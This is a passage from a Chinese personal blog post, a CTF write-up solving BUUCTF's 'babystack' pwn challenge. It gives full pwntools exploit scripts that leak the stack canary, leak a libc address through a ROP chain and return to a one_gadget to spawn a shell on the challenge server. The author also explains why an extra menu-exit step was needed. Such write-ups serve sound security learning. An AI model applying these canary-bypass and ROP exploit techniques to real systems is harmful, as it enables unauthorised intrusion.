+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x90-8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">puts_addr&#x3D;u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">#puts_addr&#x3D;u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(puts_addr)</span><br></pre></td></tr></table></figure>
+
+<p>我做完之后觉得这题巨坑真的就风水玄学呗</p>
+<p>这里如果我们不选择**p.sendlineafter(“&gt;&gt;”,’3’)**那么我们就无法接收正确的地址</p>
+<p>最后就是我们的找libc了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#libc &#x3D; LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">#system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">#bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x90-8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(bin_sh_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="这题真的噩梦才刚刚开始"><a href="#这题真的噩梦才刚刚开始" class="headerlink" title="这题真的噩梦才刚刚开始"></a>这题真的噩梦才刚刚开始</h3><p>首先我们发现我们泄露不了libc(网上那些人都不知道怎么泄露的)</p>
+<p>然后我们就选择去网站上找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;libc.blukat.me&#x2F;?q&#x3D;read+%3A250&amp;l&#x3D;libc6-i386_2.19-10ubuntu2.3_amd64</span><br></pre></td></tr></table></figure>
+
+<p>我们用pust发现不能找到版本于是我们选择使用read来</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827163957724.png?raw=true" alt="image-20210827163957724.png"></p>
+<p>注意了不要想我傻乎乎的三个都是一次，我们看到这里只有第三个是64位的，懂了吧</p>
+<p>但结果还是不行，于是我直接换上了我们的官方Libc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#from LibcSearcher import * </span><br><span class="line">#p &#x3D; process(&#39;babystack&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;babystack&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,29273)</span><br><span class="line">libc  &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">context(arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;, log_level &#x3D; &#39;debug&#39;)</span><br><span class="line"></span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400a93</span><br><span class="line">main_addr &#x3D; 0x400908</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x90-8)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;2&#39;)</span><br><span class="line">p.recvuntil(&#39;a\n&#39;)</span><br><span class="line">canary&#x3D;u64(p.recv(7).rjust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x90-8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">puts_addr&#x3D;u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">#puts_addr&#x3D;u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">#libc &#x3D; LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">#system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">#bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">one_gadget &#x3D; libc_base + 0xf1147</span><br><span class="line"></span><br><span class="line">#system_addr &#x3D; libc_base + 0x03e340</span><br><span class="line">#bin_sh_addr &#x3D; libc_base + 0x15cd24</span><br><span class="line">			# 0x45216 0x4526a  0xf02a4 0xf1147</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x90-8) + p64(canary) + p64(0) + p64(one_gadget)</span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x90-8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(bin_sh_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我以为结束了，没想到这次是玄学的开始，仍无法成功</p>
+<p>最后我认认真真的看了一遍别人的exp才发现</p>
+<p>我们漏掉了一句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#from LibcSearcher import * </span><br><span class="line">#p &#x3D; process(&#39;babystack&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;babystack&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,29273)</span><br><span class="line">libc  &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">context(arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;, log_level &#x3D; &#39;debug&#39;)</span><br><span class="line"></span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400a93</span><br><span class="line">main_addr &#x3D; 0x400908</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x90-8)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;2&#39;)</span><br><span class="line">p.recvuntil(&#39;a\n&#39;)</span><br><span class="line">canary&#x3D;u64(p.recv(7).rjust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x90-8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">puts_addr&#x3D;u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">#puts_addr&#x3D;u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">#libc &#x3D; LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">#system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">#bin_sh_addr &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">one_gadget &#x3D; libc_base + 0xf1147</span><br><span class="line"></span><br><span class="line">#system_addr &#x3D; libc_base + 0x03e340</span><br><span class="line">#bin_sh_addr &#x3D; libc_base + 0x15cd24</span><br><span class="line">			# 0x45216 0x4526a  0xf02a4 0xf1147</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#39;1&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x90-8) + p64(canary) + p64(0) + p64(one_gadget)</span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x90-8) + p64(canary) + p64(0) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(bin_sh_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;3&#39;)				--不同在这里，这里多了一次退出</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>好家伙，为什么会这样呢？</p>
+<p>我们看看没有这句的话泄露是怎么样的情况</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827164247012.png?raw=true" alt="image-20210827164247012.png"></p>
+<p>是这样的循环一直没有退出，也没有像以前那样的报错（这里我都没注意）</p>
+<p>大家可以想想以前如果不能成功get_shell的时候程序还会运行吗？</p>
+<p>如果我们加上那一句之后</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/buu%E5%88%B7%E9%A2%98-2/image-20210827164345652.png?raw=true" alt="image-20210827164345652.png"></p>
+<p>那就可以成功了，这就是玄学吗</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/08/26/buu%E5%88%B7%E9%A2%98-2/">http://example.com/2021/08/26/buu%E5%88%B7%E9%A2%98-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">攻防世界刷题-1</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/12/%E6%A0%88%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">栈类型题目总结</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
